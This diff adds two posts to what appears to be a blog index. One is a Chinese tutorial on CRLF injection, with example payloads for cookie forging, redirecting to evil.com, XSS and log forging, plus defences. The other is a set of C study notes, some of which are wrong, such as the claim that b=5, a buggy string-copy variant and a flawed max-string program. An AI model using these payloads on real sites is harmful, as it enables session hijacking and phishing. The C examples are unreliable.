@@ -62,6 +62,286 @@
       </categories>
   </entry>
   <entry>
+    <title>CRLF漏洞</title>
+    <url>/2025/02/07/CRLF%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<div id="postchat_postcontent"><h1 id="CRLF漏洞"><a href="#CRLF漏洞" class="headerlink" title="CRLF漏洞"></a>CRLF漏洞</h1><p><strong>CRLF（Carriage Return + Line Feed，回车 + 换行）</strong>，是 <code>\r\n</code> 的组合，表示文本换行</p>
+<p><code>\r\n</code>进行URL编码变成<code>%0D%0A</code></p>
+<h2 id="CRLF注入"><a href="#CRLF注入" class="headerlink" title="CRLF注入"></a>CRLF注入</h2><p>在输入中插入 <code>\r\n</code>，改变 HTTP 头部或 HTML 页面结构，进而实现 <strong>XSS、HTTP 响应拆分（HTTP Response Splitting）、Web 伪造攻击</strong></p>
+<h3 id="HTTP响应拆分"><a href="#HTTP响应拆分" class="headerlink" title="HTTP响应拆分"></a>HTTP响应拆分</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>服务器在响应 HTTP 头时，通常会使用 <code>\r\n</code> 作为分隔符</p>
+<p>如果攻击者可以在 <strong>URL 或请求头</strong>中注入 <code>\r\n</code>，就可能 <strong>伪造 HTTP 头部或插入恶意内容</strong></p>
+<h4 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Content-Type: text/html</span><br><span class="line">Set-Cookie: user=admin</span><br><span class="line"></span><br><span class="line">&lt;html&gt;&lt;body&gt;Welcome&lt;/body&gt;&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>攻击者构造请求：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://example.com/page?param=%0D%0ASet-Cookie:%20admin=true</span><br></pre></td></tr></table></figure>
+
+<p>服务器返回：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Content-Type: text/html</span><br><span class="line">Set-Cookie: user=admin</span><br><span class="line">Set-Cookie: admin=true  &lt;-- 攻击者成功伪造 Cookie</span><br><span class="line"></span><br><span class="line">&lt;html&gt;&lt;body&gt;Welcome&lt;/body&gt;&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>攻击者成功伪造cookie，可能绕过身份验证，可以用于会话劫持、钓鱼攻击等</strong></p>
+<p><strong>其可与<code>location</code>头结合进行重定向</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://example.com/page?username=%0D%0ALocation:%20https://evil.com%0D%0A</span><br></pre></td></tr></table></figure>
+
+<p>可能导致服务器返回：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Content-Type: text/html</span><br><span class="line">Set-Cookie: user=</span><br><span class="line">Location: https://evil.com   &lt;-- 伪造重定向</span><br><span class="line"></span><br><span class="line">&lt;html&gt;&lt;body&gt;Welcome!&lt;/body&gt;&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>用户被恶意跳转到<code>evil.com</code></p>
+<h3 id="CRLF与XSS结合"><a href="#CRLF与XSS结合" class="headerlink" title="CRLF与XSS结合"></a>CRLF与XSS结合</h3><p>攻击者构造请求：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://example.com/page?param=%0D%0AContent-Length:%200%0D%0A%0D%0A&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>服务器返回：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Content-Type: text/html</span><br><span class="line">Content-Length: 0  &lt;-- 伪造的 Content-Length</span><br><span class="line">                              </span><br><span class="line">&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;  &lt;-- XSS 代码被执行</span><br></pre></td></tr></table></figure>
+
+<h3 id="CRLF-造成日志伪造"><a href="#CRLF-造成日志伪造" class="headerlink" title="CRLF 造成日志伪造"></a>CRLF 造成日志伪造</h3><p>很多 Web 服务器会将请求参数写入日志，例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[INFO] 2025-02-07 12:00:00 - User input: test</span><br></pre></td></tr></table></figure>
+
+<p>如果攻击者输入 <code>\r\n</code>，可能伪造日志内容：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://example.com/page?param=%0D%0A%5BWARNING%5D%20Security%20Breach!</span><br></pre></td></tr></table></figure>
+
+<p>服务器日志可能变成：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[INFO] 2025-02-07 12:00:00 - User input: </span><br><span class="line">[WARNING] Security Breach!</span><br></pre></td></tr></table></figure>
+
+<p><strong>攻击者可以伪造系统日志，可能隐藏攻击痕迹、制造假警报等</strong></p>
+<h2 id="防御-CRLF-注入"><a href="#防御-CRLF-注入" class="headerlink" title="防御 CRLF 注入"></a>防御 CRLF 注入</h2><h3 id="过滤用户输入，移除-r-n"><a href="#过滤用户输入，移除-r-n" class="headerlink" title="过滤用户输入，移除 \r\n"></a>过滤用户输入，移除 <code>\r\n</code></h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">userInput = userInput.replace(/[\r\n]/g, &quot;&quot;);  // 删除 CRLF</span><br></pre></td></tr></table></figure>
+
+<h3 id="对-URL-参数进行编码"><a href="#对-URL-参数进行编码" class="headerlink" title="对 URL 参数进行编码"></a>对 URL 参数进行编码</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">encodeURIComponent(userInput);</span><br></pre></td></tr></table></figure>
+
+<h3 id="设置-HTTP-头安全策略"><a href="#设置-HTTP-头安全策略" class="headerlink" title="设置 HTTP 头安全策略"></a>设置 HTTP 头安全策略</h3><p>启用 <code>CSP</code> ，<strong>只允许同源（self）资源加载</strong>（内嵌 HTML（非 JS 或 CSS）），阻止外部资源加载</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Content-Security-Policy: default-src &#x27;self&#x27;</span><br></pre></td></tr></table></figure>
+
+<h3 id="HTTP-头中使用安全-API"><a href="#HTTP-头中使用安全-API" class="headerlink" title="HTTP 头中使用安全 API"></a>HTTP 头中使用安全 API</h3><p>在 <code>setHeader()</code> 时避免拼接用户输入：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">res.setHeader(&quot;Set-Cookie&quot;, `user=$&#123;encodeURIComponent(username)&#125;`);</span><br></pre></td></tr></table></figure>
+
+<h3 id="确保日志安全"><a href="#确保日志安全" class="headerlink" title="确保日志安全"></a>确保日志安全</h3><p>使用 <code>JSON.stringify()</code> 记录日志，防止换行</p>
+<p>避免直接写入用户输入</p>
+</div>]]></content>
+      <categories>
+        <category>漏洞</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>C语言</title>
+    <url>/2025/02/05/C%E8%AF%AD%E8%A8%80/</url>
+    <content><![CDATA[<div id="postchat_postcontent"><h1 id="C语言易错难懂知识"><a href="#C语言易错难懂知识" class="headerlink" title="C语言易错难懂知识"></a>C语言易错难懂知识</h1><h2 id="一些基础知识"><a href="#一些基础知识" class="headerlink" title="一些基础知识"></a>一些基础知识</h2><p>1.进制</p>
+<p>二进制：0b开头</p>
+<p>八进制：0开头</p>
+<p>十六进制：0X开头（0<del>9，A</del>F）</p>
+<p>2.float  4字节 有效数字6</p>
+<p>   double  8字节 有效数字15</p>
+<p>不同类型数据运算时，除强制类型转换外，结果都为double型</p>
+<p>在一个整数末尾加L&#x2F;l表示长整型</p>
+<p>eg. int b&#x3D;5;</p>
+<p>​      float a&#x3D;2.0;</p>
+<p>​      b&#x3D;b&#x2F;2*a; &#x2F;&#x2F;b&#x3D;5</p>
+<p>3.素数中：不必被2<del>（n-1）整除，只需被2</del>✓n即可，j*j&lt;i</p>
+<p>4.a%b结果由a的正负性决定，只要a为负数，结果为负数</p>
+<p>5.常量和常变量</p>
+<p>常变量：在定义变量时，加一个const</p>
+<p>​            eg.const int a&#x3D;3;</p>
+<p>变量：</p>
+<p>（1）整型变量 1000</p>
+<p>（2）实型变量 12.34e3</p>
+<p>（3）字符常量（只能为一个字符,’ \42 ‘为一个字符）</p>
+<p>​       1）普通字符：以ASCII码存储</p>
+<p>​                                常见的ASCII：’A’ &#x3D;65   ‘a’ &#x3D;97   0 &#x3D;48</p>
+<p>​       2）转义字符：以’ \ ‘开头，将’ \ ‘后的字符转化为另外意思</p>
+<p>​                             eg.’ \x41 ‘表示16进制41的ASCII字符，即’ A ‘</p>
+<p>​       3）字符串常量：“boy”</p>
+<p>​       4）符号常量（不能对其赋新值）：#define PI 3.1416</p>
+<p>6.标识符：只由字母，数字，下划线组成；第一个字符必须是字母或下划线</p>
+<p>7.unsigned int &#x3D;&gt;无符号整型  输出用%u</p>
+<p>   （充分利用变量的值的范围（数据范围只有正值））</p>
+<p>8.逗号表达式结果取后面的值</p>
+<p>  eg.i&#x3D;(a&#x3D;6,a*5),a+6;&#x2F;&#x2F;&gt;i&#x3D;30</p>
+<p>9.要输出%应该连续使用2个%</p>
+<p>10.字符变量</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">char c=&#x27; ? &#x27;;</span><br><span class="line">printf(&quot;%d %c&quot;,c,c);</span><br><span class="line">=&gt;63 ?</span><br></pre></td></tr></table></figure>
+
+<p>11.i++和++i</p>
+<p>i&#x3D;3;</p>
+<p>j&#x3D;i++(i&#x3D;4,j&#x3D;3)&#x2F;&#x2F;先赋值后自加</p>
+<p>j&#x3D;++i(i&#x3D;4,j&#x3D;4)&#x2F;&#x2F;先自加在赋值</p>
+<p>12.输出：</p>
+<p>用%f得到6位小数</p>
+<p>%-m.nf ：</p>
+<p>​	   -号为左对齐</p>
+<p>​	  m为最小宽度：输出的总宽度（包括小数点、小数部分和整数部分）如果实际数据长度小于 m，将用空格填充；如果数据长度超过 				     m，则按实际长度输出，不截断</p>
+<p>​	  n为小数小数位数：如果实际小数位数超过 n，会进行四舍五入；如果不足n，会用0补足</p>
+<p>%e指定以指数形式输出实数，自动给出数字部分小数位数为6位，指数部分占5列</p>
+<p>eg.1.234560 e+002</p>
+<p>13.运算符优先级</p>
+<p><img src="https://raw.githubusercontent.com/zkk1233/Picture/main/20250117135802930.png"></p>
+<p>14.字符（一个）输入输出：</p>
+<p>getchar  putchar(c)</p>
+<p>15.在判断一个量是否为真时，0为假，非0为真</p>
+<p>a&amp;&amp;b&#x2F;&#x2F;a和b都非0（只有a为真时，才需要判别b的值）</p>
+<p>a||b&#x2F;&#x2F;a和b至少一个非0（只有a为假时才需要判别b的值）</p>
+<p>16.判断非闰年：</p>
+<p><code>!((year%4==0&amp;&amp;year%100!=0)||year%400==0)</code></p>
+<p>17.两个数乘积&#x3D;两个数最大公约数 x 最小公倍数</p>
+<h2 id="选择结构"><a href="#选择结构" class="headerlink" title="选择结构"></a>选择结构</h2><h3 id="？：表达式（代替复杂的if）"><a href="#？：表达式（代替复杂的if）" class="headerlink" title="？：表达式（代替复杂的if）"></a>？：表达式（代替复杂的if）</h3><p>max&#x3D;(a&gt;b)?a:b;&#x2F;&#x2F;a&gt;b为真的话，max&#x3D;a，否则为b</p>
+<h3 id="switch"><a href="#switch" class="headerlink" title="switch"></a>switch</h3><p>switch(表达式){</p>
+<p>​	case 常量1:语句1;</p>
+<p>​	……</p>
+<p>​	default:……;</p>
+<p>}</p>
+<h2 id="循环结构"><a href="#循环结构" class="headerlink" title="循环结构"></a>循环结构</h2><h3 id="while语句"><a href="#while语句" class="headerlink" title="while语句"></a>while语句</h3><p>只要循环条件表达式为真时，就执行</p>
+<p>eg.while(i–)&#x2F;&#x2F;每次循环开始先检查i当前值是否为真，若为真，循环继续，每次循环结束时i值减少一</p>
+<h3 id="do-while语句"><a href="#do-while语句" class="headerlink" title="do while语句"></a>do while语句</h3><p>先无条件执行，再判断循环条件是否成立</p>
+<h3 id="for语句"><a href="#for语句" class="headerlink" title="for语句"></a>for语句</h3><p>for(…;…[只要值为真，就执行循环];…)</p>
+<h3 id="break和continue"><a href="#break和continue" class="headerlink" title="break和continue"></a>break和continue</h3><p>break：提前终止循环</p>
+<p>continue：提前结束本次循环，接着执行下次循环</p>
+<h2 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h2><p><code>a[3][4]</code> &#x3D;&gt;3行4列</p>
+<h3 id="字符数组"><a href="#字符数组" class="headerlink" title="字符数组"></a>字符数组</h3><h4 id="字符串结束标志"><a href="#字符串结束标志" class="headerlink" title="字符串结束标志"></a>字符串结束标志</h4><p>一个字符串以字符<code>&#39;\0&#39;</code>作为结束标志（c语言在字符数组储存字符串常量市会自动加一个’\0’作结束符）</p>
+<h4 id="字符数组的输入输出"><a href="#字符数组的输入输出" class="headerlink" title="字符数组的输入输出"></a>字符数组的输入输出</h4><p>%s &#x3D;&gt;整个字符串</p>
+<p>%c &#x3D;&gt;一个字符</p>
+<p>输出时遇到’\0’就停止输出</p>
+<p>scanf输入项如果是字符数组名，不加&amp;</p>
+<p>scanf读取字符串时，会在遇空白字符时停止读取</p>
+<h5 id="单行字符串"><a href="#单行字符串" class="headerlink" title="单行字符串"></a>单行字符串</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">while((ch=getchar())!=&#x27;\n&#x27;)&#123;</span><br><span class="line">	a[i]=ch;</span><br><span class="line">	i++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">char string[100];</span><br><span class="line">char c;</span><br><span class="line">gets(string);</span><br><span class="line">for(int i=0;(c=string[i])!=&#x27;\0&#x27;;i++)&#123;···&#125;\\遍历字符串中每个字符</span><br></pre></td></tr></table></figure>
+
+<h5 id="n行字符串"><a href="#n行字符串" class="headerlink" title="n行字符串"></a>n行字符串</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scanf(&quot;%d&quot;,&amp;n);</span><br><span class="line">getchar();</span><br><span class="line">char a[100];</span><br><span class="line">for(int i=0;i&lt;n;i++)&#123;</span><br><span class="line">	gets(a);</span><br><span class="line">	···</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scanf(&quot;%d&quot;,&amp;n);</span><br><span class="line">getchar();</span><br><span class="line">char string[n][100];</span><br><span class="line">for(int i=0;i&lt;n;i++)&#123;</span><br><span class="line">	gets(string[i]);</span><br><span class="line">	for(int j=0;string[i][j]!=&#x27;\0&#x27;;j++)&#123;···&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="字符串处理函数"><a href="#字符串处理函数" class="headerlink" title="字符串处理函数"></a>字符串处理函数</h4><p>记得加<code>#include&lt;string.h&gt;</code></p>
+<h5 id="puts"><a href="#puts" class="headerlink" title="puts"></a>puts</h5><p>输出的字符串中可以包含转义字符</p>
+<p>e.g </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">char str[]=&#123;&quot;abc \n def&quot;&#125;;</span><br><span class="line">puts(str);</span><br><span class="line">   =&gt;abc</span><br><span class="line">     def</span><br></pre></td></tr></table></figure>
+
+<h5 id="gets"><a href="#gets" class="headerlink" title="gets"></a>gets</h5><p>从终端输入一个字符串到字符数组，并且得到一个函数值，该函数值是字符数组的起始地址</p>
+<p>注：gets和puts函数只能输入&#x2F;输出一个字符串</p>
+<h5 id="strcat"><a href="#strcat" class="headerlink" title="strcat"></a>strcat</h5><p>把两个字符数组中字符串连接起来</p>
+<p>strcat(str1,str2);</p>
+<h5 id="strcpy和strncpy"><a href="#strcpy和strncpy" class="headerlink" title="strcpy和strncpy"></a>strcpy和strncpy</h5><p>字符串复制函数</p>
+<h6 id="strcpy"><a href="#strcpy" class="headerlink" title="strcpy"></a>strcpy</h6><p>将字符串2复制到字符数组1中</p>
+<p>注：赋值语句只能将一个字符赋给一个字符型变量&#x2F;字符数组元素</p>
+<h6 id="strncpy"><a href="#strncpy" class="headerlink" title="strncpy"></a>strncpy</h6><p>将字符串2中前n个字符复制到字符数组1中</p>
+<p>strncpy(str1,str2,2);&#x2F;&#x2F;将str2前2个取代str1原有的2个</p>
+<h5 id="strcmp"><a href="#strcmp" class="headerlink" title="strcmp"></a>strcmp</h5><p>字符串比较：2个字符串从左到右逐个比较（ASCII值），直到出现不同字符或遇到’\0’为止</p>
+<p>字符串1&#x3D;字符串2  函数值为0</p>
+<p>字符串1&gt;字符串2  函数值为正整数</p>
+<p>字符串1&lt;字符串2  函数值为负整数</p>
+<h5 id="strlen"><a href="#strlen" class="headerlink" title="strlen"></a>strlen</h5><p>测字符串长度</p>
+<h5 id="strlwr"><a href="#strlwr" class="headerlink" title="strlwr"></a>strlwr</h5><p>转换为小写</p>
+<h5 id="strupr"><a href="#strupr" class="headerlink" title="strupr"></a>strupr</h5><p>转换为大写</p>
+<h4 id="头文件"><a href="#头文件" class="headerlink" title="&lt;ctype.h&gt;头文件"></a>&lt;ctype.h&gt;头文件</h4><p>isalpha判断一个字符是否是字母</p>
+<p>isdigit判断一个字符是否是数字</p>
+<p>islower判断一个字符是否是小写字母</p>
+<p>isupper判断一个字符是否是大写字母</p>
+<p>isspace判断一个字符是否是空白字符</p>
+<p>tolower将字符大写变小写</p>
+<p>toupper将字符小写变大写</p>
+<h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><h3 id="函数的定义与声明"><a href="#函数的定义与声明" class="headerlink" title="函数的定义与声明"></a>函数的定义与声明</h3><p>在定义函数时要指定函数的类型</p>
+<p>函数类型决定返回值类型</p>
+<p>用函数原型（函数首部）作函数声明</p>
+<p>e.g int add(int a,int b);</p>
+<h3 id="函数的嵌套"><a href="#函数的嵌套" class="headerlink" title="函数的嵌套"></a>函数的嵌套</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int max4(int a,int b,int c,int d)&#123;</span><br><span class="line">	int max2(int a,int b);</span><br><span class="line">	return max2(max2(max2(a,b),c),d);</span><br><span class="line">&#125;</span><br><span class="line">int max2(int a,int b)&#123;</span><br><span class="line">	return(a&gt;=b?a:b);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="局部与全局变量"><a href="#局部与全局变量" class="headerlink" title="局部与全局变量"></a>局部与全局变量</h3><p>注：全局变量开头一般用大写字母，来区别局部变量</p>
+<h4 id="static"><a href="#static" class="headerlink" title="static"></a>static</h4><p>静态局部&#x2F;全局变量</p>
+<p>函数中局部变量的值在函数调用结束后不消失而继续保留本次调用结束后的值</p>
+<p>e.g <code>static int f=1;</code></p>
+<h4 id="extern"><a href="#extern" class="headerlink" title="extern"></a>extern</h4><p>外部变量声明</p>
+<p>在一个文件内扩展外部变量的作用域</p>
+<p>将外部变量的作用域扩展到其他文件</p>
+<p>e.g <code>extern A,B,C; \ \可省略int等类型</code></p>
+<h2 id="指针"><a href="#指针" class="headerlink" title="指针"></a>指针</h2><h3 id="指针变量"><a href="#指针变量" class="headerlink" title="指针变量"></a>指针变量</h3><p>指针是一个地址，而指针变量是存放地址的变量</p>
+<p>指针变量中只能存放地址（指针），不要将一个整数给指针变量</p>
+<p>p&#x3D;&a;</p>
+<p>*p&#x3D;1;\ \将1赋值给p所指向的变量即把1赋给a</p>
+<p>定义：类型名 * 指针变量名</p>
+<p>​	int* point;      </p>
+<p>​	point&#x3D;&a;\ \等价于int* point&#x3D;&a;</p>
+<p>函数调用时不加*</p>
+<p>e.g swap(point_1,point_2);</p>
+<p>为使在函数中改变的变量能被main所用，应该用指针变量做函数参数</p>
+<p>e.g</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">void swap(int *p1,int *p2)&#123;</span><br><span class="line">	int temp;</span><br><span class="line">	temp=*p1;</span><br><span class="line">	*p1=*p2;</span><br><span class="line">	*p2=temp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="通过指针引用数组"><a href="#通过指针引用数组" class="headerlink" title="通过指针引用数组"></a>通过指针引用数组</h3><h4 id="一维数组"><a href="#一维数组" class="headerlink" title="一维数组"></a>一维数组</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int *p;</span><br><span class="line">p=&amp;a[0];\\不能写成*p=&amp;a[0];</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">p=&amp;a[0];</span><br><span class="line">p=a;\\p的值是数组a的首元素</span><br></pre></td></tr></table></figure>
+
+<p>如果指针元素p指向数组中的一个元素，则p+1指向同一数组的下个元素，p-1指向同一数组的上个元素</p>
+<p>如果p的初值为&amp;a[0]，则p+i&#x2F;a+i即a[i]的地址，*(p+i)&#x2F; *(a+i)是p+i&#x2F;a+i所指向的数组元素即a[i]</p>
+<p>两个地址不能相加</p>
+<p>若指针变量p1、p2都指向同一数组中的元素，p2-p1结果为(p2-p1)的值（地址之差）</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int i,a[10];</span><br><span class="line">int* p=a;\\p初值是a，p指向a[0]</span><br><span class="line">for(i=0;i&lt;10;i++)scanf(&quot;%d&quot;,p++);</span><br><span class="line">p=a;\\重新使p指向a[0]</span><br><span class="line">for(i=0;i&lt;10;i++,p++)printf(&quot;%d&quot;,*p);</span><br></pre></td></tr></table></figure>
+
+<p>若a[0]&#x3D;3，++(*p) &#x3D;&gt;a[0]&#x3D;4</p>
+<p>fun(int arr[],int n)  &#x3D;  fun(int* arr,int n)</p>
+<h4 id="二维数组"><a href="#二维数组" class="headerlink" title="二维数组"></a>二维数组</h4><p><code>*(a[i]+j)</code>或 <code>*(*(a+i)+j)</code>是<code>a[i][j]</code>的值</p>
+<p>对于a是二维数组，则a[i]是一位数组名，他是一个地址，并不代表一个储存单元&#x2F;其中的值</p>
+<p><img src="https://raw.githubusercontent.com/zkk1233/Picture/main/20250119103815734.png"></p>
+<p>int (*p)[4]定义包含4个元素的一维数组的指针变量</p>
+<p>e.g 有一个二维数组<code>int arr[3][4]</code>，可用int (*p)[4]来声明一个指针p指向这个二维数组某一行</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int arr[3][4]=&#123;&#123;0,1,2,3&#125;,&#123;4,5,6,7&#125;,&#123;8,9,10,11&#125;&#125;;</span><br><span class="line">int (*p)[4]=&amp;arr[0];\\p指向arr某一行</span><br></pre></td></tr></table></figure>
+
+<h3 id="通过指针引用字符串"><a href="#通过指针引用字符串" class="headerlink" title="通过指针引用字符串"></a>通过指针引用字符串</h3><p>通过字符数组名&#x2F;字符指针变量可以输出一个字符串</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">char* a,str[10];</span><br><span class="line">a=str;</span><br><span class="line">scanf(&quot;%s&quot;,a);</span><br></pre></td></tr></table></figure>
+
+<p>数组名虽代表地址，但它是常量，其值不可改变</p>
+<p>字符指针变量指向的字符串常量中的内容是不可被取代</p>
+<h3 id="指向函数的指针"><a href="#指向函数的指针" class="headerlink" title="指向函数的指针"></a>指向函数的指针</h3><p>函数名是一个指针（地址）</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int (*p)(int,int)</span><br><span class="line">p=max;\\将函数入口地址赋给p</span><br><span class="line">c=(*p)(a,b);\\用*p代替函数名</span><br></pre></td></tr></table></figure>
+
+<p>char* p[6]包含6个指针的数值</p>
+<h2 id="用户自己建立数据类型"><a href="#用户自己建立数据类型" class="headerlink" title="用户自己建立数据类型"></a>用户自己建立数据类型</h2><h3 id="结构体"><a href="#结构体" class="headerlink" title="结构体"></a>结构体</h3><p>struct 结构体名{</p>
+<p>​	成员表列（类型名 成员名）;</p>
+<p>};</p>
+<p>引用结构体变量中成员的值：结构体变量名.成员名 e.gstudent1.num&#x3D;10010;</p>
+<p>不能通过输出结构体变量名来达到输出结构体变量所有成员的值</p>
+<p>若p指向一个结构体变量stu</p>
+<p>则 stu.num &lt;&#x3D;&gt; (*p).num &lt;&#x3D;&gt; p-&gt;num</p>
+<p>结构体数组读入不用加&amp;</p>
+<h3 id="共用体"><a href="#共用体" class="headerlink" title="共用体"></a>共用体</h3><p>union 共用体名{</p>
+<p>​	成员表列（类型名 成员名）;</p>
+<p>};</p>
+<h3 id="typedef声明新类型名"><a href="#typedef声明新类型名" class="headerlink" title="typedef声明新类型名"></a>typedef声明新类型名</h3><h1 id="C语言经典例题"><a href="#C语言经典例题" class="headerlink" title="C语言经典例题"></a>C语言经典例题</h1><h2 id="统计一个字符串中每个单词的字符数"><a href="#统计一个字符串中每个单词的字符数" class="headerlink" title="统计一个字符串中每个单词的字符数"></a>统计一个字符串中每个单词的字符数</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">int main()&#123;</span><br><span class="line">	char c;</span><br><span class="line">	int count=0;\\用于统计当前单词的字符数</span><br><span class="line">	int first=1;\\用于标记是否是第一个输出的字符数，初始值为1，表示是第一个</span><br><span class="line">	while(scanf(&quot;%c&quot;,&amp;c)&amp;&amp;c!=&#x27;.&#x27;)&#123;</span><br><span class="line">		if(c==&#x27; &#x27;)&#123;\\如果读取到的字符是空格，说明当前单词结束</span><br><span class="line">			if(count&gt;0)&#123;\\如果count大于0，说明前面有单词字符被统计</span><br><span class="line">				if(!first)printf(&quot; &quot;);\\如果first为0（即不是第一个输出），则先输出一个空格作为分隔</span><br><span class="line">				printf(&quot;%d&quot;,count);</span><br><span class="line">				first=0;</span><br><span class="line">				count=0;\\重置count为0，准备统计下一个单词</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		else count++;\\如果读取到的字符不是空格，则count加1，继续统计当前单词的字符数</span><br><span class="line">	&#125;</span><br><span class="line">	if(count&gt;0)&#123;\\循环结束后，如果count大于0，说明最后一个单词的字符数还没有输出</span><br><span class="line">		if(!first)printf(&quot; &quot;);\\如果不是第一个输出，先输出一个空格</span><br><span class="line">		printf(&quot;%d&quot;,count);\\输出最后一个单词的字符数</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="统计3个字符串，并找出其中最大值"><a href="#统计3个字符串，并找出其中最大值" class="headerlink" title="统计3个字符串，并找出其中最大值"></a>统计3个字符串，并找出其中最大值</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">#include&lt;string.h&gt;</span><br><span class="line">int main()&#123;</span><br><span class="line">	char str [3] [20];</span><br><span class="line">	char string[20];</span><br><span class="line">	for(int i=0;i&lt;3;i++)&#123;</span><br><span class="line">		gets(str[i]);</span><br><span class="line">	&#125;</span><br><span class="line">	for(int i=0;i&lt;2;i++)&#123;</span><br><span class="line">		if(strcmp(str[i],str[i+1])&gt;0)strcpy(string,str[i]);</span><br><span class="line">		if(strcmp(str[i],str[i+1])&lt;=0)strcpy(string,str[i+1]);</span><br><span class="line">	&#125;</span><br><span class="line">	printf(&quot;%s&quot;,string);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="字符串的复制（指针）"><a href="#字符串的复制（指针）" class="headerlink" title="字符串的复制（指针）"></a>字符串的复制（指针）</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">void copy_string(char* from,char* to)&#123;</span><br><span class="line">	while((*to=*from)!=&#x27;\0&#x27;)&#123;</span><br><span class="line">		to++;</span><br><span class="line">		from++;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">void copy_string(char* from,char* to)&#123;</span><br><span class="line">	while((*to++=*from++)!=&#x27;\0&#x27;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">void copy_string(char* from,char* to)&#123;</span><br><span class="line">	while(*from!=&#x27;\0&#x27;)&#123;</span><br><span class="line">		*to++=*from++;</span><br><span class="line">		*to=&#x27;\0&#x27;;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="选择排序"><a href="#选择排序" class="headerlink" title="选择排序"></a>选择排序</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">void selectSort(int arr[],int n)&#123;</span><br><span class="line">    int i,j,minIndex,temp;</span><br><span class="line">    for(i=0;i&lt;n-1;i++)&#123;  //外层循环控制排序趟数</span><br><span class="line">        minIndex=i;  //假设当前位置元素就是最小值</span><br><span class="line">        for (j=i+1;j&lt;n;j++)&#123;  //内层循环在剩余元素中找最小值</span><br><span class="line">            if(arr[j]&lt;arr[minIndex])minIndex=j;  //更新最小值索引</span><br><span class="line">        &#125;</span><br><span class="line">        if(minIndex!=i)&#123;  //如果找到更小的元素，进行交换</span><br><span class="line">            temp=arr[i];</span><br><span class="line">            arr[i]=arr[minIndex];</span><br><span class="line">            arr[minIndex]=temp;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="人数过半"><a href="#人数过半" class="headerlink" title="人数过半"></a>人数过半</h2><p>输入N个数，求出现次数超过总数一半的数。数据保证存在这个数。</p>
+<p>输入格式:</p>
+<p>第一行输入一个正整数N(N&lt;1000)；</p>
+<p>第二行输入N个数，每个数的绝对值不超过1e9。</p>
+<p>输出格式:</p>
+<p>输出一个数，即出现次数超过总数一半的数。</p>
